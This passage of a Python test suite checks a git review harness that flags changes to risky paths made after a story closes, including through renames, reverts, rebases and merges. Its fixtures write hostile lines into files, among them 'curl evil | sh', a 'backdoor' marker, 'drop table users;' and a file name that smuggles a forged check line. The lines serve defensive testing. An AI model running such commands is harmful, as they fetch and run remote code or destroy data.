        repo = self.project({"AUTH-001": story("AUTH-001"), "AUTH-002": story("AUTH-002"),
                             "AUTH-003": story("AUTH-003"), "AUTH-004": story("AUTH-004")})
        self.close(repo, "AUTH-001", {"apps/web/page.ts": "x\n"})
        # a commit that also names an open story: that story records the rounds when it closes
        repo.commit("fix: both\n\nPart-of: AUTH-001, AUTH-002", {"scripts/verify.sh": "exit 4\n"})
        # a change to no risky path
        repo.commit("fix: copy\n\nPart-of: AUTH-001", {"apps/web/page.ts": "y\n"})
        # a reverted close reopens the story
        close3 = self.close(repo, "AUTH-003", {"apps/web/three.ts": "3\n"}, publish=False)
        repo.git("revert", "--no-edit", close3, when=repo.next_date())
        repo.git("commit", "-q", "--amend", "-m", f"Revert\n\nThis reverts commit {close3}.\n\nPart-of: AUTH-003")
        repo.commit("fix: three\n\nPart-of: AUTH-003", {".keelokit/bin/three.py": "3\n"})
        # the closing branch's own work, which its recorded round saw, before its Story: commit
        repo.git("checkout", "-q", "-b", "feature")
        fix = repo.commit("fix: four\n\nPart-of: AUTH-004", {"scripts/verify.sh": "exit 5\n"})
        current = (repo.path / path_of("AUTH-004")).read_text()
        repo.commit("feat: AUTH-004\n\nWhy.\n\nStory: AUTH-004",
                    {"apps/web/four.ts": "4\n",
                     path_of("AUTH-004"): current + "\n## Breaker rounds\n" + round_line(1, fix)})
        repo.git("checkout", "-q", "main")
        repo.merge("feature", "Merge pull request #4 from x/feature")
        repo.publish()
        self.assertEqual(self.after_close(self.check(repo)[1]), [])

    def test_HARN_022_S3_a_pull_request_changing_a_closed_storys_risky_path_fails(self):
        repo = self.project({"AUTH-001": story("AUTH-001")})
        self.close(repo, "AUTH-001", {"apps/web/page.ts": "x\n"})
        repo.git("checkout", "-q", "-b", "feature")
        repo.commit("fix: later\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 0\n"})
        repo.git("push", "-q", "origin", "feature")
        repo.git("checkout", "-q", "main")
        code, diffs = self.check(BreakerPullRequestTest.pull_request(self, repo, "feature", number=71), "--ci",
                                 env=PR_ENV)
        self.assertEqual(code, 1)
        self.assertIn("error", self.after_close(diffs))


class DirectoryTouchTest(BreakerCase):
    """HARN-022 S4 (B2): a touch that names a directory meets every glob beneath it."""

    def test_HARN_022_S4_a_directory_touch_meets_a_glob_beneath_it(self):
        stories = {"AUTH-001": story("AUTH-001", touches=("apps/api",)),
                   "AUTH-002": story("AUTH-002", touches=("apps/api/",)),
                   "AUTH-003": story("AUTH-003", touches=("apps/api/page.ts",)),
                   "AUTH-004": story("AUTH-004", touches=("./apps/api",))}
        repo = self.project(stories)
        for sid in stories:
            self.close(repo, sid, publish=False)
        repo.publish()
        missing = {s for level, c, s in self.breaker(self.check(repo)[1]) if c == "BREAKER_MISSING"}
        self.assertEqual(missing, {"AUTH-001", "AUTH-002", "AUTH-004"})
        r = repo.ledger("risky", "AUTH-001")
        self.assertIn("AUTH-001: risky", r.stdout)
        self.assertIn("**/migrations/**", r.stdout)
        self.assertIn("AUTH-003: not risky", repo.ledger("risky", "AUTH-003").stdout)

    def test_HARN_022_S4_a_directory_meets_only_globs_that_can_live_beneath_it(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("apps/web",))},
                            risky='paths = ["services/*/migrations/**", "apps/api/**"]\n')
        self.assertIn("AUTH-001: not risky", repo.ledger("risky", "AUTH-001").stdout)
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("services",))},
                            risky='paths = ["services/*/migrations/**"]\n')
        self.assertIn("AUTH-001: risky", repo.ledger("risky", "AUTH-001").stdout)


class HarnRound1Test(BreakerCase):
    """HARN-022 cold breaker, round 1 (ESC-356, ESC-357): each finding reproduced as a failing test first."""

    def closing_branch(self, repo: GitRepo, number: int) -> list[dict]:
        """A branch that closes AUTH-004, then fixes a risky path under Part-of:, with its round recorded on the
        branch's last head; the pull request's RISKY_AFTER_CLOSE differences."""
        repo.git("checkout", "-q", "-b", "feature")
        repo.commit("feat: AUTH-004\n\nWhy.\n\nStory: AUTH-004", {"apps/web/four.ts": "4\n"})
        repo.commit("fix: four\n\nPart-of: AUTH-004", {"scripts/verify.sh": "exit 5\n"})
        head = repo.sha()
        current = (repo.path / path_of("AUTH-004")).read_text()
        repo.commit("docs: AUTH-004 round 1\n\nPart-of: AUTH-004",
                    {path_of("AUTH-004"): current + "\n## Breaker rounds\n" + round_line(1, head)})
        repo.git("push", "-q", "origin", "feature")
        repo.git("checkout", "-q", "main")
        ci = BreakerPullRequestTest.pull_request(self, repo, "feature", number=number)
        return [d for d in self.check(ci, "--ci", env=PR_ENV)[1] if d["code"] == "RISKY_AFTER_CLOSE"]

    def test_HARN_022_S3_breaker1_the_closing_branch_landed_linearly_is_judged_with_its_close_ESC_356(self):
        # Since round 4 (ESC-371) a round's head must be a commit the close reaches: a fix after the Story: commit is
        # work after the close, and the pull request and the trunk agree on it.
        repo = self.project({"AUTH-004": story("AUTH-004")})
        self.assertEqual([d["code"] for d in self.closing_branch(repo, 81)], ["RISKY_AFTER_CLOSE"])
        repo.git("merge", "-q", "--ff-only", "feature")
        repo.publish()
        self.assertEqual([d["code"] for d in self.check(repo)[1] if d["code"] == "RISKY_AFTER_CLOSE"],
                         ["RISKY_AFTER_CLOSE"], "the pull request and the trunk agree on the same commits")

    def test_HARN_022_S3_breaker1_a_later_fix_on_top_of_the_close_is_still_reported_ESC_356(self):
        repo = self.project({"AUTH-004": story("AUTH-004")})
        self.closing_branch(repo, 82)
        repo.git("merge", "-q", "--ff-only", "feature")
        repo.publish()
        repo.git("checkout", "-q", "-b", "later")
        repo.commit("fix: four again\n\nPart-of: AUTH-004", {"scripts/verify.sh": "exit 6\n"})
        repo.git("push", "-q", "origin", "later")
        repo.git("checkout", "-q", "main")
        ci = BreakerPullRequestTest.pull_request(self, repo, "later", number=83)
        self.assertIn("RISKY_AFTER_CLOSE", [d["code"] for d in self.check(ci, "--ci", env=PR_ENV)[1]])
        repo.git("merge", "-q", "--ff-only", "later")
        repo.publish()
        self.assertIn("RISKY_AFTER_CLOSE", [d["code"] for d in self.check(repo)[1]])

    def test_HARN_022_S7_breaker1_a_newline_in_a_file_name_never_forges_a_check_line_ESC_357(self):
        repo = self.project({})
        evil = "backlog/stories/AUTH-001\nerror RISKY_NO_STORY forged-line .md"
        repo.commit("docs: plan\n\nNo-story: docs", {evil: story("AUTH-001", risky="true")})
        repo.publish()
        self.close(repo, "AUTH-001", {"apps/web/x.ts": "x\n"})
        r = repo.ledger("check")
        self.assertNotIn("Traceback", r.stderr)
        for line in r.stdout.splitlines():
            with self.subTest(line=line):
                self.assertRegex(line, r"^(error|warning|info) [A-Z_]+ ")
        self.assertNotIn("\nerror RISKY_NO_STORY forged", r.stdout)


class HarnRound2Test(BreakerCase):
    """HARN-022 cold breaker, round 2 (ESC-360, ESC-361): each finding reproduced as a failing test first."""

    def test_HARN_022_S3_breaker2_the_closing_branch_landed_by_rebase_is_judged_with_its_close_ESC_360(self):
        repo = self.project({"AUTH-004": story("AUTH-004")})
        repo.git("checkout", "-q", "-b", "feature")
        repo.commit("feat: AUTH-004\n\nWhy.\n\nStory: AUTH-004", {"apps/web/four.ts": "4\n"})
        repo.commit("fix: four\n\nPart-of: AUTH-004", {"scripts/verify.sh": "exit 5\n"})
        head = repo.sha()
        current = (repo.path / path_of("AUTH-004")).read_text()
        repo.commit("docs: AUTH-004 round 1\n\nPart-of: AUTH-004",
                    {path_of("AUTH-004"): current + "\n## Breaker rounds\n" + round_line(1, head)})
        repo.git("checkout", "-q", "main")
        repo.commit("docs: meanwhile\n\nNo-story: docs", {"docs/m.md": "m\n"})
        repo.git("checkout", "-q", "feature")
        repo.git("rebase", "-q", "main")  # GitHub's "Rebase and merge": new shas, the round's head is not landed
        repo.git("checkout", "-q", "main")
        repo.git("merge", "-q", "--ff-only", "feature")
        repo.git("branch", "-q", "-D", "feature")
        repo.publish()
        # since round 4 (ESC-371): the fix came after the Story: commit and the round's head was rewritten away, so
        # the round is no clean round of the landed code and the fix is work after the close, as in its pull request
        codes = [d["code"] for d in self.check(repo)[1]]
        self.assertIn("RISKY_AFTER_CLOSE", codes)
        self.assertIn("BREAKER_BAD_ENTRY", codes)
        # other work after the rebased close: a later fix is new work again
        repo.commit("docs: later\n\nNo-story: docs", {"docs/l.md": "l\n"})
        repo.commit("fix: four again\n\nPart-of: AUTH-004", {"scripts/verify.sh": "exit 6\n"})
        repo.publish()
        self.assertIn("RISKY_AFTER_CLOSE", [d["code"] for d in self.check(repo)[1]])

    def test_HARN_022_S4_breaker2_a_touch_on_the_repository_root_meets_every_path_ESC_361(self):
        for touch in ("./", "/", ".", "./."):
            with self.subTest(touch=touch):
                repo = self.project({"AUTH-001": story("AUTH-001", touches=(touch,))},
                                    risky='paths = ["scripts/verify.sh", "services/*/migrations/**"]\n')
                self.assertIn("AUTH-001: risky", repo.ledger("risky", "AUTH-001").stdout)


class HarnRound3Test(BreakerCase):
    """HARN-022 cold breaker, round 3 (ESC-365..367): each finding reproduced as a failing test first. The pull request
    and the trunk give one verdict for one branch, however it lands."""

    LANDINGS = ("merge", "fast-forward", "rebase")

    def branch(self, repo: GitRepo, commits: list, meanwhile: bool = True) -> None:
        """`feature` off main: ("close"), ("other"), ("fix"), ("round", what its head is) in the given order."""
        repo.git("checkout", "-q", "-b", "feature")
        shas = {}
        for kind, *arg in commits:
            if kind == "close":
                shas["close"] = repo.commit("feat: AUTH-004\n\nWhy.\n\nStory: AUTH-004", {"apps/web/four.ts": "4\n"})
            elif kind == "other":
                repo.commit("docs: changelog line\n\nNo-story: docs", {"CHANGELOG.md": "x\n"})
            elif kind == "fix":
                shas["fix"] = repo.commit("fix: four\n\nPart-of: AUTH-004", {"scripts/verify.sh": "exit 5\n"})
            else:
                current = (repo.path / path_of("AUTH-004")).read_text()
                repo.commit("docs: AUTH-004 round 1\n\nPart-of: AUTH-004",
                            {path_of("AUTH-004"): current + "\n## Breaker rounds\n" + round_line(1, shas[arg[0]])})
        repo.git("push", "-q", "origin", "feature")
        repo.git("checkout", "-q", "main")
        if meanwhile:
            repo.commit("docs: meanwhile\n\nNo-story: docs", {"docs/m.md": "m\n"})
        repo.publish()

    def verdicts(self, commits: list, number: int) -> dict:
        found = {}
        for i, landing in enumerate(self.LANDINGS):
            repo = self.project({"AUTH-004": story("AUTH-004")})
            self.branch(repo, commits, meanwhile=landing != "fast-forward")
            ci = BreakerPullRequestTest.pull_request(self, repo, "feature", number=number * 10 + i)
            found["pull request"] = [d["code"] for d in self.check(ci, "--ci", env=PR_ENV)[1]
                                     if d["code"] == "RISKY_AFTER_CLOSE"]
            if landing == "merge":
                repo.merge("feature", f"Merge pull request #{number}")
            else:
                if landing == "rebase":  # GitHub's "Rebase and merge": new shas
                    repo.git("checkout", "-q", "feature")
                    repo.git("rebase", "-q", "main")
                    repo.git("checkout", "-q", "main")
                repo.git("merge", "-q", "--ff-only", "feature")
            repo.publish()
            found[landing] = [d["code"] for d in self.check(repo)[1] if d["code"] == "RISKY_AFTER_CLOSE"]
        return found

    def test_HARN_022_S3_breaker3_other_work_between_the_close_and_a_fix_the_round_saw_ESC_365(self):
        # Since round 4 (ESC-371) the Story: commit comes after the work and its rounds; other work in between changes
        # nothing, however the branch lands.
        found = self.verdicts([("fix",), ("other",), ("round", "fix"), ("close",)], 91)
        self.assertEqual(found, {k: [] for k in ("pull request", *self.LANDINGS)})
        # the old order (the Story: commit first) is work after the close, everywhere
        found = self.verdicts([("close",), ("other",), ("fix",), ("round", "fix")], 92)
        self.assertEqual(found, {k: ["RISKY_AFTER_CLOSE"] for k in ("pull request", *self.LANDINGS)})

    def test_HARN_022_S3_breaker3_a_fix_after_the_round_was_recorded_is_reported_everywhere_ESC_366(self):
        found = self.verdicts([("close",), ("round", "close"), ("fix",)], 93)
        self.assertEqual(found, {k: ["RISKY_AFTER_CLOSE"] for k in ("pull request", *self.LANDINGS)})

    def test_HARN_022_S4_breaker3_every_spelling_of_a_directory_is_one_ESC_367(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("apps/v1.2/.",)),
                             "AUTH-002": story("AUTH-002", touches=("apps/v1.2/",)),
                             "AUTH-003": story("AUTH-003", touches=("apps/v1.2/./",))})
        for sid in ("AUTH-001", "AUTH-002", "AUTH-003"):
            with self.subTest(sid=sid):
                self.assertIn(f"{sid}: risky", repo.ledger("risky", sid).stdout)


class HarnRound4Test(BreakerCase):
    """HARN-022 round 4, the coordinator's breaker (ESC-369..372): each finding reproduced as a failing test first."""

    @staticmethod
    def codes(diffs: list[dict]) -> list[tuple[str, str]]:
        return [(d["level"], d["code"]) for d in diffs]

    def closed_with_round(self) -> GitRepo:
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        repo.commit("feat: check\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 1\n"})
        self.close(repo, "AUTH-001", {"apps/web/x.ts": "x\n"}, rounds=round_line(1, repo.sha()))
        self.assertEqual(self.check(repo), (0, []))
        return repo

    def test_HARN_022_S3_breaker4_renaming_the_story_file_never_hides_a_change_after_the_close_ESC_369(self):
        for how in ("rename", "rename and edit"):
            with self.subTest(how=how):
                repo = self.closed_with_round()
                repo.commit("fix: unreviewed\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 0  # backdoor\n"})
                repo.git("mv", path_of("AUTH-001"), "backlog/stories/AUTH-001-renamed.md")
                if how == "rename and edit":
                    path = repo.path / "backlog/stories/AUTH-001-renamed.md"
                    path.write_text(path.read_text() + "\nA line.\n")
                    repo.git("add", "-A")
                repo.git("commit", "-q", "-m", "docs: rename story\n\nNo-story: docs", when=repo.next_date())
                repo.publish()
                self.assertIn(("error", "RISKY_AFTER_CLOSE"), self.codes(self.check(repo)[1]))

    def test_HARN_022_S3_breaker4_renaming_hides_nothing_in_a_pull_request_either_ESC_369(self):
        repo = self.closed_with_round()
        repo.git("checkout", "-q", "-b", "feature")
        repo.commit("fix: unreviewed\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 0  # backdoor\n"})
        repo.git("mv", path_of("AUTH-001"), "backlog/stories/AUTH-001-renamed.md")
        repo.git("commit", "-q", "-m", "docs: rename story\n\nNo-story: docs", when=repo.next_date())
        repo.git("push", "-q", "origin", "feature")
        repo.git("checkout", "-q", "main")
        ci = BreakerPullRequestTest.pull_request(self, repo, "feature", number=151)
        self.assertIn(("error", "RISKY_AFTER_CLOSE"), self.codes(self.check(ci, "--ci", env=PR_ENV)[1]))

    def test_HARN_022_S3_breaker4_a_second_file_with_the_id_does_not_move_the_record_ESC_369(self):
        repo = self.closed_with_round()
        repo.commit("fix: unreviewed\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 0  # backdoor\n"})
        copy = (repo.path / path_of("AUTH-001")).read_text()
        repo.commit("docs: a copy\n\nNo-story: docs", {"backlog/stories/AUTH-001-copy.md": copy})
        repo.publish()
        self.assertIn(("error", "RISKY_AFTER_CLOSE"), self.codes(self.check(repo)[1]))

    def test_HARN_022_S3_breaker4_reverting_a_reviewed_fix_after_the_close_is_reported_ESC_370(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        repo.commit("feat: check\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 1  # vulnerable\n"})
        fix = repo.commit("fix: round 1 finding\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 1  # fixed\n"})
        self.close(repo, "AUTH-001", {"apps/web/x.ts": "x\n"},
                   rounds=round_line(1, fix, "1 finding: ESC-1 · fixed") + round_line(2, fix))
        self.assertEqual(self.check(repo), (0, []))
        repo.git("revert", "--no-edit", fix, when=repo.next_date())
        repo.git("commit", "-q", "--amend", "-m", f"Revert fix\n\nThis reverts commit {fix}.\n\nPart-of: AUTH-001")
        repo.publish()
        self.assertIn(("error", "RISKY_AFTER_CLOSE"), self.codes(self.check(repo)[1]))

    def test_HARN_022_S3_breaker4_reverting_unreviewed_work_after_the_close_is_a_risky_change_too_ESC_370(self):
        # Since round 8 a revert gets no exemption (ESC-383): a revert of a risky change is itself a risky change.
        # The reverted commit counts as reverted (not reported); the revert is reported until a round covers it.
        repo = self.closed_with_round()
        bad = repo.commit("fix: unreviewed\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 0  # backdoor\n"})
        repo.git("revert", "--no-edit", bad, when=repo.next_date())
        repo.git("commit", "-q", "--amend", "-m", f"Revert\n\nThis reverts commit {bad}.\n\nPart-of: AUTH-001")
        revert = repo.sha()
        repo.publish()
        found = [d for d in self.check(repo)[1] if d["code"] == "RISKY_AFTER_CLOSE"]
        self.assertEqual(len(found), 1)
        self.assertIn(revert[:12], found[0]["detail"])

    def test_HARN_022_S1_breaker4_risky_code_after_the_last_clean_round_is_stale_ESC_371(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        a = repo.commit("feat: reviewed\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 1\n"})
        cur = (repo.path / path_of("AUTH-001")).read_text()
        repo.commit("docs: round 1\n\nPart-of: AUTH-001",
                    {path_of("AUTH-001"): cur + "\n## Breaker rounds\n" + round_line(1, a)})
        late = repo.commit("fix: unreviewed\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 0  # backdoor\n"})
        repo.commit("feat: AUTH-001\n\nWhat was decided.\n\nStory: AUTH-001", {"apps/web/x.ts": "x\n"})
        repo.publish()
        code, diffs = self.check(repo)
        self.assertEqual(code, 1)
        stale = [d for d in diffs if d["code"] == "BREAKER_STALE"]
        self.assertEqual([d["level"] for d in stale], ["error"])
        self.assertIn(late[:12], stale[0]["detail"])

    def test_HARN_022_S1_breaker4_a_round_head_that_is_no_commit_of_the_close_is_no_clean_round_ESC_371(self):
        for head in ("f" * 40, "e" * 40):
            with self.subTest(head=head):
                repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
                rounds = ("".join(round_line(i, repo.sha(), "2 findings: X · fixed") for i in (1, 2, 3))
                          + round_line(4, head))
                self.close(repo, "AUTH-001", {"scripts/verify.sh": "exit 0\n"}, rounds=rounds)
                found = self.codes(self.check(repo)[1])
                self.assertIn(("warning", "BREAKER_BAD_ENTRY"), found)
                self.assertIn(("warning", "BREAKER_UNRESOLVED"), found)
        # a commit that exists but that the close does not reach (another branch's) is no clean round either
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        repo.git("checkout", "-q", "-b", "elsewhere")
        other = repo.commit("chore: elsewhere\n\nNo-story: docs", {"docs/e.md": "e\n"})
        repo.git("push", "-q", "origin", "elsewhere")
        repo.git("checkout", "-q", "main")
        self.close(repo, "AUTH-001", {"scripts/verify.sh": "exit 0\n"}, rounds=round_line(1, other))
        found = self.codes(self.check(repo)[1])
        self.assertIn(("warning", "BREAKER_BAD_ENTRY"), found)
        self.assertIn(("warning", "BREAKER_UNRESOLVED"), found)

    def test_HARN_022_S1_breaker4_an_abbreviated_head_that_resolves_counts_ESC_371(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        a = repo.commit("feat: reviewed\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 1\n"})
        self.close(repo, "AUTH-001", {"apps/web/x.ts": "x\n"}, rounds=round_line(1, a[:9]))
        self.assertEqual(self.check(repo), (0, []))

    def test_HARN_022_S4_breaker4_dot_parts_inside_a_touch_are_normalised_ESC_372(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=(".keelokit/./bin",)),
                             "AUTH-002": story("AUTH-002", touches=("apps/../.keelokit/bin",)),
                             "AUTH-003": story("AUTH-003", touches=("../outside/.keelokit/bin",))},
                            risky='paths = [".keelokit/bin/**"]\n')
        self.assertIn("AUTH-001: risky", repo.ledger("risky", "AUTH-001").stdout)
        self.assertIn("AUTH-002: risky", repo.ledger("risky", "AUTH-002").stdout)
        self.assertIn("AUTH-003: not risky", repo.ledger("risky", "AUTH-003").stdout)


class HarnRound5Test(BreakerCase):
    """HARN-022 cold breaker, round 5 (ESC-373..378): each finding reproduced as a failing test first; the decisions
    are the coordinator's."""

    @staticmethod
    def codes(diffs: list[dict]) -> list[str]:
        return [d["code"] for d in diffs]

    def closed(self) -> tuple[GitRepo, str]:
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        before = repo.sha()
        close = self.close(repo, "AUTH-001", {"scripts/verify.sh": "exit 1\n"}, rounds=round_line(1, HEAD))
        self.assertEqual(self.check(repo), (0, []))
        return repo, close

    def test_HARN_022_S3_breaker5_a_later_round_line_never_launders_a_change_after_the_close_ESC_373(self):
        for which in ("old head", "the close"):
            with self.subTest(head=which):
                repo, close = self.closed()
                old = repo.sha("HEAD~1")
                repo.commit("fix: later\n\nPart-of: AUTH-001", {"scripts/verify.sh": "curl evil | sh\n"})
                cur = (repo.path / path_of("AUTH-001")).read_text()
                head = old[:10] if which == "old head" else close
                repo.commit("docs: round 2\n\nPart-of: AUTH-001", {path_of("AUTH-001"): cur + round_line(2, head)})
                repo.publish()
                self.assertIn("RISKY_AFTER_CLOSE", self.codes(self.check(repo)[1]))

    def test_HARN_022_S3_breaker5_a_new_round_on_the_change_recorded_by_a_re_close_covers_it_ESC_373(self):
        repo, _ = self.closed()
        late = repo.commit("fix: later\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 2\n"})
        cur = (repo.path / path_of("AUTH-001")).read_text()
        repo.commit("feat: AUTH-001 again\n\nWhy.\n\nStory: AUTH-001", {path_of("AUTH-001"): cur + round_line(2, late)})
        repo.publish()
        codes = self.codes(self.check(repo)[1])
        self.assertNotIn("RISKY_AFTER_CLOSE", codes)
        self.assertNotIn("BREAKER_STALE", codes)

    def test_HARN_022_S3_breaker5_a_revert_of_no_commit_or_of_no_ancestor_is_no_revert_ESC_374(self):
        repo, _ = self.closed()
        repo.git("checkout", "-q", "-b", "side")
        other = repo.commit("chore: side\n\nNo-story: docs", {"docs/side.md": "s\n"})
        repo.git("checkout", "-q", "main")
        for target in ("d" * 40, other):
            with self.subTest(target=target[:8]):
                repo.commit(f"fix: later\n\nThis reverts commit {target}.\n\nPart-of: AUTH-001",
                            {"scripts/verify.sh": f"curl evil-{target[:4]} | sh\n"})
                repo.publish()
                self.assertIn("RISKY_AFTER_CLOSE", self.codes(self.check(repo)[1]))

    def test_HARN_022_S3_breaker5_a_path_with_a_line_separator_never_fakes_a_revert_ESC_375(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))}, risky=None)
        two, one = ".keelokit/bin/x\u2028two", ".keelokit/bin/x\u2028one"
        harness(repo, "chore: old tool\n\nNo-story: harness", {two: "evil\n"})
        harness(repo, "chore: risky stories\n\nNo-story: harness", {RISKY: RISKY_TOML})
        repo.publish()
        self.close(repo, "AUTH-001", {"scripts/verify.sh": "exit 1\n"}, rounds=round_line(1, HEAD))
        self.assertEqual(self.check(repo), (0, []))
        t = harness(repo, "fix: tool\n\nPart-of: AUTH-001", {one: "evil\n"})
        repo.git("rm", "-q", two)
        repo.git("commit", "-q", "-m", f'Revert "fix: tool"\n\nThis reverts commit {t}.\n\nPart-of: AUTH-001',
                 when=repo.next_date())
        repo.publish()
        self.assertIn("RISKY_AFTER_CLOSE", self.codes(self.check(repo)[1]))

    def merged_main(self, evil: bool) -> list[str]:
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        repo.git("checkout", "-q", "-b", "feature")
        w = repo.commit("feat: w\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 1\n"})
        cur = (repo.path / path_of("AUTH-001")).read_text()
        repo.commit("docs: round 1\n\nPart-of: AUTH-001",
                    {path_of("AUTH-001"): cur + "\n## Breaker rounds\n" + round_line(1, w)})
        repo.git("checkout", "-q", "main")
        repo.commit("docs: z\n\nNo-story: docs", {"docs/z.md": "z\n"})
        repo.publish()
        repo.git("checkout", "-q", "feature")
        repo.git("merge", "-q", "--no-ff", "--no-commit", "main")
        if evil:
            repo.write("scripts/verify.sh", "curl evil | sh\n")
        repo.git("add", "-A")
        repo.git("commit", "-q", "-m", "Merge branch 'main' into feature\n\nPart-of: AUTH-001", when=repo.next_date())
        repo.commit("feat: AUTH-001\n\nWhy.\n\nStory: AUTH-001", {"apps/x.ts": "x\n"})
        repo.git("checkout", "-q", "main")
        repo.merge("feature", "Merge pull request #1 from x/feature")
        repo.publish()
        return self.codes(self.check(repo)[1])

    def test_HARN_022_S1_breaker5_a_clean_merge_of_main_after_the_round_is_not_stale_ESC_376(self):
        self.assertNotIn("BREAKER_STALE", self.merged_main(evil=False))

    def test_HARN_022_S1_breaker5_a_merge_whose_own_resolution_is_risky_is_stale_ESC_376(self):
        self.assertIn("BREAKER_STALE", self.merged_main(evil=True))

    def test_HARN_022_S1_breaker5_risky_code_in_the_story_commit_itself_is_stale_ESC_377(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        w = repo.commit("feat: w\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 1\n"})
        cur = (repo.path / path_of("AUTH-001")).read_text()
        close = repo.commit("feat: AUTH-001\n\nWhy.\n\nStory: AUTH-001",
                            {"scripts/verify.sh": "curl evil | sh\n",
                             path_of("AUTH-001"): cur + "\n## Breaker rounds\n" + round_line(1, w)})
        repo.publish()
        stale = [d for d in self.check(repo)[1] if d["code"] == "BREAKER_STALE"]
        self.assertEqual(len(stale), 1)
        self.assertIn(close[:12], stale[0]["detail"])

    def test_HARN_022_S1_breaker5_an_invalid_last_round_says_no_valid_round_ESC_378(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        self.close(repo, "AUTH-001", {"scripts/verify.sh": "exit 0\n"}, rounds=round_line(1, "f" * 40))
        (d,) = [d for d in self.check(repo)[1] if d["code"] == "BREAKER_UNRESOLVED"]
        self.assertIn("no valid round", d["detail"])
        self.assertNotIn("left findings", d["detail"])

    def test_HARN_022_S3_breaker5_the_message_says_it_touches_a_risky_path_per_risky_toml_ESC_378(self):
        repo, _ = self.closed()
        repo.commit("fix: later\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 2\n"})
        repo.publish()
        (d,) = [d for d in self.check(repo)[1] if d["code"] == "RISKY_AFTER_CLOSE"]
        self.assertIn("touches a risky path (per .keelokit/risky.toml)", d["detail"])

    def test_HARN_022_S2_breaker5_build_story_merges_main_after_the_rounds_never_rebases(self):
        text = " ".join((ROOT / "skills/build-story/SKILL.md").read_text().split())
        self.assertIn("after the breaker rounds, merge", text.lower())
        design = " ".join((ROOT / "docs/design.md").read_text().split()).lower()
        self.assertIn("squash and rebase landings", design)


class HarnRound6Test(BreakerCase):
    """HARN-022 cold breaker, round 6 (ESC-379, ESC-380): each finding reproduced as a failing test first."""

    def parallel(self) -> GitRepo:
        """AUTH-001's closing branch (its work, a round on it, the Story: commit); meanwhile another delivery of
        AUTH-001 lands on main and changes a migration that no round saw."""
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        repo.git("checkout", "-q", "-b", "feature")
        head = repo.commit("feat: work\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 1\n"})
        current = (repo.path / path_of("AUTH-001")).read_text()
        repo.commit("feat: AUTH-001\n\nWhy.\n\nStory: AUTH-001",
                    {path_of("AUTH-001"): current + "\n## Breaker rounds\n" + round_line(1, head)})
        repo.git("push", "-q", "origin", "feature")
        repo.git("checkout", "-q", "main")
        self.par = repo.commit("feat: parallel delivery\n\nPart-of: AUTH-001",
                               {"db/migrations/0001.sql": "drop table users;\n"})
        repo.publish()
        return repo

    def test_HARN_022_S1_breaker6_a_risky_commit_of_the_story_the_close_does_not_reach_is_stale_ESC_379(self):
        repo = self.parallel()
        ci = BreakerPullRequestTest.pull_request(self, repo, "feature", number=161)
        stale = [d for d in self.check(ci, "--ci", env=PR_ENV)[1] if d["code"] == "BREAKER_STALE"]
        self.assertEqual(len(stale), 1, "the pull request")
        self.assertIn(self.par[:12], stale[0]["detail"])
        repo.merge("feature", "Merge pull request #161 from x/feature")
        repo.publish()
        stale = [d for d in self.check(repo)[1] if d["code"] == "BREAKER_STALE"]
        self.assertEqual(len(stale), 1, "the trunk")
        self.assertIn(self.par[:12], stale[0]["detail"])

    def test_HARN_022_S1_breaker6_a_decided_round_covers_only_what_its_head_saw_ESC_380(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))}, risky=RISKY_TOML + 'deciders = ["Leo"]\n')
        h = repo.commit("feat: work\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 1\n"})
        late = repo.commit("feat: later\n\nPart-of: AUTH-001", {"db/migrations/0001.sql": "drop table users;\n"})
        current = (repo.path / path_of("AUTH-001")).read_text()
        repo.commit("feat: AUTH-001\n\nWhy.\n\nStory: AUTH-001", {path_of("AUTH-001"): current + "\n## Breaker rounds\n"
                    + round_line(1, h, "1 finding · none") + "- Decision · Leo · 2026-11-28 · land as it is\n"})
        repo.publish()
        stale = [d for d in self.check(repo)[1] if d["code"] == "BREAKER_STALE"]
        self.assertEqual(len(stale), 1)
        self.assertIn(late[:12], stale[0]["detail"])


MIG = "apps/api/migrations/m.sql"
MIG_TOML = 'rounds = 3\ndimensions = ["security"]\npaths = ["**/migrations/**"]\n'
MIG_BASE = "".join(f"{i}\n" for i in range(1, 31))


class HarnRound7Test(BreakerCase):
    """HARN-022 cold breaker, round 7 (ESC-381, ESC-382): each finding reproduced as a failing test first, from the
    round's probes; the decisions are the coordinator's. A merge's own change is its tree against git's automatic
    merge of its parents (`git merge-tree`); a merge revert reverts what a brought commit changed, path by path."""

